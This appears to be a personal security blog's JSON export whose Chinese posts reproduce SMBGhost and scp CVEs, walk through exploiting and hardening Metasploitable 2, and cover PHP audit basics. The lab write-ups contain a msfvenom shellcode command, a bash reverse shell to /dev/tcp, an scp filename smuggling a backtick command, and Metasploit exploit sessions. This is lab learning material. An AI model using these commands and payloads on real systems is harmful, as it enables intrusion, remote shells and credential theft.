{"meta":{"title":"Sheng 's blog","subtitle":"","description":"","author":"Sheng","url":"https://ms12020.github.io","root":"/"},"pages":[{"title":"about","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-10T11:06:54.282Z","comments":true,"path":"about/index.html","permalink":"https://ms12020.github.io/about/index.html","excerpt":"","text":""},{"title":"404","date":"2020-05-29T16:00:00.000Z","updated":"2021-04-10T11:08:39.449Z","comments":true,"path":"404/index.html","permalink":"https://ms12020.github.io/404/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-10T11:06:13.530Z","comments":true,"path":"categories/index.html","permalink":"https://ms12020.github.io/categories/index.html","excerpt":"","text":""},{"title":"contact","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-10T12:22:13.221Z","comments":true,"path":"contact/index.html","permalink":"https://ms12020.github.io/contact/index.html","excerpt":"","text":"留言板尚未开放，想要留言可加作者QQ并进行联系。"},{"title":"friends","date":"2018-12-12T13:25:30.000Z","updated":"2021-04-10T11:07:39.931Z","comments":true,"path":"friends/index.html","permalink":"https://ms12020.github.io/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-10T10:23:38.000Z","updated":"2021-04-10T11:06:34.186Z","comments":true,"path":"tags/index.html","permalink":"https://ms12020.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"","slug":"CVE_2020_0796(永恒之黑)漏洞复现","date":"2021-04-10T12:43:29.473Z","updated":"2021-04-10T12:43:09.349Z","comments":true,"path":"2021/04/10/CVE_2020_0796(永恒之黑)漏洞复现/","link":"","permalink":"https://ms12020.github.io/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"CVE-2020-0796（永恒之黑)漏洞原理 SMB远程代码执行漏洞 SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵 Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出 利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端 影响版本Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, Version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, Version 1909 (Server Core installation) 漏洞复现工具下载 漏洞检测工具：http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip 攻击poc：https://github.com/eerykitty/CVE-2020-0796-PoC shell脚本：https://github.com/chompie1337/SMBGhost_RCE_PoC 蓝屏复现环境 目标机：Windows 10 1903 ip: 10.7.1.111（虚拟机） 攻击机：Windows 10 20H2 ip: 10.7.6.254（物理机） 将目标机的防火墙关闭 在攻击机上对目标机进行检测，看其是否存在漏洞。 利用下载的poc脚本发起攻击 反弹shell环境 目标机：Windows 10 1903 ip: 10.7.1.111（虚拟机） 攻击机：Windows 10 20H2 ip: 10.7.6.254（物理机） 生成一个反弹木马 msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\\x00' -i 1 -f python 说明: #-p payload #-e 编码方式 #-i 编码次数 #-b 过滤坏字符 #LHOST,LPORT 监听上线的主机IP和端口 #-f python 生成python格式 #‘\\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。 用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容 开启msf监听模块 运行exploit.py脚本，发起攻击反弹shell 这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。","categories":[],"tags":[]},{"title":"CVE-2020-15778 OpenSSL漏洞复现","slug":"CVE-2020-15778(OpenSSL)漏洞复现","date":"2021-04-10T12:40:24.207Z","updated":"2021-04-10T12:41:59.084Z","comments":true,"path":"2021/04/10/CVE-2020-15778(OpenSSL)漏洞复现/","link":"","permalink":"https://ms12020.github.io/2021/04/10/CVE-2020-15778(OpenSSL)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"CVE-2020-15778 OpenSSL影响版本： OpenSSH &lt;= 8.3p1 漏洞介绍 漏洞公开披露2020年7月18日，openssh 8.3p1的SCP命令存在命令注入漏洞，攻击者可以利用此漏洞执行任意命令。 局限性 适用范围小，需要知道root用户密码，最大最用为ssh无法连接，但scp可以使用时 环境搭建 使用iptables策略搭建环境，禁用ssh登录，只保留scp(CentOS) 关闭自带防火墙(firewalld) 停止firewalld服务 $ systemctl stop firewalld 设置iptables策略 service iptables start iptables -t filter -A INPUT -p tcp --dport 22 -m tos --tos 0x10 -j DROP service iptables save iptables -L -n --line-number 验证 scp功能正常使用，但是ssh在输入密码后，无任何回响，无法连接，证明iptables策略成功有效。 漏洞复现在kali里面新建1.sh，写入反弹shell的bash命令 bash -i >& /dev/tcp/10.7.5.120>&1 kali监听6666端口 使用scp命令传输文件到CentOS的/tmp目录 命令执行，运行1.sh scp 1.sh root@192.168.1.135:/'`sh /tmp/1.sh`' 漏洞分析 scp命令源码 if (remin == -1) &#123; xasprintf(&bp, \"%s -t %s%s\", cmd, *targ == '-' ? \"-- \" : \"\", targ); if (do_cmd(thost, tuser, tport, bp, &remin, &remout) < 0) exit(1); if (response() < 0) exit(1); free(bp); &#125; 当执行本地scp命令时，scp不会检查、过滤和清除文件名。这使得攻击者执行带有反引号的有效scp命令时，本地shell还将执行反引号中的命令。 修复建议补丁/升级","categories":[],"tags":[]},{"title":"Metasploitable 2","slug":"Metasploitable2","date":"2021-04-10T12:36:04.239Z","updated":"2021-04-10T12:35:52.082Z","comments":true,"path":"2021/04/10/Metasploitable2/","link":"","permalink":"https://ms12020.github.io/2021/04/10/Metasploitable2/","excerpt":"","text":"Metasploitable 2 未加固前端口开放情况 vsftpd 2.3.4(21)发现漏洞 验证漏洞┌──(sheng㉿sheng)-[~] └─$ msfconsole msf6 > search vsftpd 234 msf6 > use 0 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 172.16.107.245 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit 获得root用户弱口令 安全加固 通过防火墙过滤6200后门端口 验证加固成功，该漏洞无法利用 ssh弱口令(22)发现漏洞 验证漏洞┌──(sheng㉿sheng)-[~] └─$ msfconsole msf6 > search ssh_login msf6 > use 0 msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 172.16.107.245 msf6 auxiliary(scanner/ssh/ssh_login) > set username root msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file dic.txt msf6 auxiliary(scanner/ssh/ssh_login) > exploit 安全加固 禁止root用户远程登入（vim /etc/ssh/sshd_config） 验证无法远程登入root用户(密码未修改) 修改弱口令 telnet弱口令(23)发现漏洞 验证漏洞telnet 172.16.107.245 安全加固 验证漏洞已修复 PHP CGI参数注入执行漏洞(80)发现漏洞 验证漏洞 url最后添加?-s,即可看到页面的源代码 ┌──(sheng㉿sheng)-[~] └─$ msfconsole msf6 > search PHP_CGI msf6 > use use exploit/multi/http/php_cgi_arg_injection msf6 exploit(multi/http/php_cgi_arg_injection) > set rhosts 172.16.107.245 msf6 exploit(multi/http/php_cgi_arg_injection) > exploit 安全加固（未）NFS共享目录配置漏洞(111) 发现漏洞 验证漏洞 查看NFS服务是否开启 查看远程共享目录列表 生产rsa公钥 创建共享目录 将靶机共享的目录挂在到该文件夹下 若出现mount.nfs:……报错，需要/etc/init.d/rpcbind start来启动mount 将公钥追加到靶机的authorized_keys下 实现无密码远程登入 安全加固 不共享根目录，共享一个低权限目录，共享权限变低 (/etc/exports) Samba MS-RPC Shell命令注入漏洞(139) 发现漏洞 验证漏洞┌──(sheng㉿sheng)-[~] └─$ msfconsole msf6 > search usermap_script msf6 > use exploit/multi/samba/usermap_script msf6 exploit(multi/samba/usermap_script) > set rhosts 172.16.107.245 msf6 exploit(multi/samba/usermap_script) > set lhost 172.16.107.14 msf6 exploit(multi/samba/usermap_script) > set lport 4445 安全加固vim /etc/samba/smb.conf 将username……一行注释掉 重启服务 验证该漏洞无法利用 Samba sysmlink默认配置目录遍历漏洞(445) 发现漏洞 验证漏洞 smbclient从4.11开始协议取消了nt1,使用smbv2,所以导致协议不能协商,会出现protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED报错 解决方法: 如果是直接连接服务器,服务器是linux平台搭建的samba,就直接客户端访问的时候添加--option=&#39;client min protocol=nt1&#39; smbclient //172.16.10.189/tmp --option='client min protocol=nt1' 在新窗口下执行smbclient命令打开上面生产的共享目录 进入rootfs目录 列出密码文件,利用成功 安全加固 通过查看配置文件可以看到有两个共享文件夹 分别查看两个共享目录 查看/tmp的详细信息 删除共享中的软链接即可 验证漏洞无法利用 Rlogin后门漏洞(512,513,514) 发现漏洞 验证漏洞 安全加固 删除危险账户，设置可登入系统的账户密码为高难度密码 Java RMI SERVER命令执行漏洞(1099,48319) 发现漏洞 验证漏洞┌──(sheng㉿sheng)-[~/Desktop] └─$ msfconsole msf6 > search java_rmi msf6 > use auxiliary/scanner/misc/java_rmi_server msf6 auxiliary(scanner/misc/java_rmi_server) > set rhosts 172.16.107.245 msf6 auxiliary(scanner/misc/java_rmi_server) > exploit [+] 172.16.107.245:1099 - 172.16.107.245:1099 Java RMI Endpoint Detected: Class Loader Enabled [*] 172.16.107.245:1099 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf6 > use exploit/multi/misc/java_rmi_server msf6 exploit(multi/misc/java_rmi_server) > set rhosts 172.16.107.245 rhosts => 172.16.107.245 msf6 exploit(multi/misc/java_rmi_server) > set lhost 172.16.107.14 lhost => 172.16.107.14 msf6 exploit(multi/misc/java_rmi_server) > exploit ...... meterpreter > 安全加固 最有效的加固方法是安装补丁或者升级 如果在无法立即安装补丁或者升级的情况下,可以使用防火墙规则来阻止服务器被攻击 Ingreslock后门漏洞(1524) 发现漏洞 验证漏洞 安全加固 MySQL弱口令(3306)发现漏洞 验证漏洞mysql -h 172.16.107.245 -uroot -p 空密码 安全加固 添加root强密码 删除其他可远程登入数据库的危险账户 Distcc后门漏洞(3632)发现漏洞 验证漏洞使用distcc_exec模块 安全加固 使用防火墙策略 验证漏洞无法利用 vnc默认密码登入(5200)发现漏洞 验证漏洞 安全加固 修改vnc连接密码为强密码 验证漏洞无法再次利用 UnrealRCd后门漏洞(6667,6697)发现漏洞 验证漏洞 安全加固 升级服务版本 Tomcat管理台默认口令漏洞(8180)发现漏洞 验证漏洞 通过tomcat_mgr_login爆出管理台默认 通过tomcat_mgr_deploy模块得到shell tomcat默认端口8080 安全加固 修改默认管理用户密码 再次爆破管理台密码,失败 登入提示漏洞发现漏洞 验证漏洞使用账号msfadmin；密码msfadmin登入系统 安全加固 删除页面提示（vim /etc/issue) 危险系统用户发现漏洞 验证漏洞 发现有许多可登入系统的弱密码用户 将可登入系统的用户的shadow文件保存到pass 使用john工具破解密码 使用用户密码登入系统 安全加固 加强密码强度 SUID提权发现漏洞 查看系统上运行的所有SUID可执行文件。 find / -user root -perm -4000 -print 2>/dev/null find / -perm -u=s -type f 2>/dev/null find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; 以上所有二进制文件都将以root用户权限执行，因为它们的权限中包含”s”，并且对应的是root权限。 验证漏洞 利用nmap进行提权 较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。 交互模式可以通过执行Nmap参数interactive 安全加固 将nmap版本升级到5.21以上","categories":[],"tags":[]},{"title":"PHP代码审计基础概念","slug":"代码审计概述","date":"2021-04-10T08:42:14.704Z","updated":"2021-04-10T08:44:46.962Z","comments":true,"path":"2021/04/10/代码审计概述/","link":"","permalink":"https://ms12020.github.io/2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/","excerpt":"","text":"PHP代码审计工具代码编辑器 Notepad++ Visual Studio Code 代码审计工具 Seay源代码审计系统 Firtufy SCA RIPS 漏洞验证辅助 BurpSuite Community 浏览器扩展 编码转换、加密解密工具 正则调试工具 SQL执行监控工具 思路 检查铭感函数的参数，然后回溯变量，判断变量是否可控并且没有经过严格的过滤（逆向追踪） 找出哪些文件在接收外部传入的参数，然后跟踪变量的传递过程，观察是否有变量传入到高危函数中，或者传递的过程中是否有代码逻辑漏洞（正向追踪） 直接挖掘功能点漏洞，根据自身的禁言判断该类应用通常在哪些功能中会出现漏洞，直接全篇阅读该功能代码 学好代码审计需要掌握一下几点 PHP编程语言的特性和基础 Web前端编程基础 漏洞形成原理 代码审计思路 不同系统、中间件之间的特性差异 PHP核心配置​ 常见PHP_INI_*常量的定义 常量 含义 PHP_INI_USER 该配置选项可在用户的PHP脚本或Windows注册表中设置 PHP_INI_PERDIR 该配置选项可在php.ini、.htaccess或httpd.conf中设置 PHP_INI_SYSTEM 该配置选项可在php.ini或httpd.conf中配置 PHP_INI_ALL 该配置选项可在任何地方设置 php.ini.only 该配置选项可仅可在php.ini中配置 常见核心配置register_globals(全局变量注册开关) 版本：&lt;= PHP 5.3.0 在选项设置为on的情况下，会直接吧用户GET、POST等方式提交上来的参数注册成全局变量并初始化值为参数对应的值，使得提交的参数可以直接在脚本中使用 allow_url_include(是否允许包含远程文件) 版本：PHP all PHP 5.2.0之后默认为Off 类似函数：allow_url_fopen(是否打开远程文件) 在该配置为on的情况下，它可以直接远程包含文件，当存在include($var)并且$var可控的情况下，可以直接控制其来执行PHP代码 magic_quotes_gpc(魔术引号自动过滤) 版本：&lt; PHP 5.4； PHP 5.3之后不推荐使用该函数 置返回： &lt; PHP 4.2.3配置范围为PHP_INI_ALL；&gt; PHP 4.2.3配置范围为PHP_INI_PERDIR 当选项为On时，在不存在编码或者其他绕过绕过的情况下，可以使得很多漏洞无法利用，他会自动在GET、POST、COOKIE变量中的单引号&#39;&#39;、双引号&quot;&quot;、反斜杠\\以及空字符NULL的前面加上反斜杠 在PHP5中magic_quotes_gpc不会过滤$_SERVER变量，导致很多client-ip、referer一类的漏洞能够利用。 open_basedir(PHP可访问目录) 版本：PHP ALL 范围：&lt; PHP 5.2.3配置范围为PHP_INI_SYSTEM；&gt; PHP 5.2.3配置范围PHP_INI_ALL open_basedir指令用来限制PHP只能访问哪些目录，通常只需要设置Web文件目录即可，如果需要加载其他外部脚本，也需要吧脚本所在的目录路径加入到open_basedir指令中，多个目录用分号(;)分隔 # `open_basedir`指定的实际上时前缀，而不是目录名 open_basedir=/www/a # 设定可访问的目录为/www下以a开头的文件，也就是说/www/a和/www/ab都可以被访问 open_basedir=/www/a/ # 设置只能访问/www/a文件 当open_basedir配置目录后，执行脚本访问其他函数都需要验证文件是否符合配置要求，因此会影响效率 disable_functions(禁用函数) 版本：PHP ALL 范围：该指令的配置范围为php.ini only 在正式生产环境中，为了更安全地允许PHP，也可以使用disable_functions指令来禁止一些敏感函数的使用。当你使用该指令禁用危险函数时，切记将dl()函数加到禁止列表中，因为攻击者可以利用dl()函数来加载自定义的PHP扩展以突破disable_functions的限定 # 多个函数之间用逗号（,）分隔 disable_functions=phpinfo,eval,passthru,exec,system,dl disable_errors和error_reporting(错误显示) 版本：PHP ALL 配置范围：PHP_INI_ALL disable_errors表明是否显示PHP脚本内部的错误，在调试时通常将PHP错误显示打开，但是在生产环境中，建议关闭PHP错误回显。 为了避免一些安全隐患，在设置disable_errors=On时，还可以配置error_reporting，这个选项用来配置错误显示的级别，可使用数字也可使用内置常量配置。 ​ 数字格式与变量格式的详细信息 ​ 常用指令及说明","categories":[],"tags":[]}],"categories":[],"tags":[]}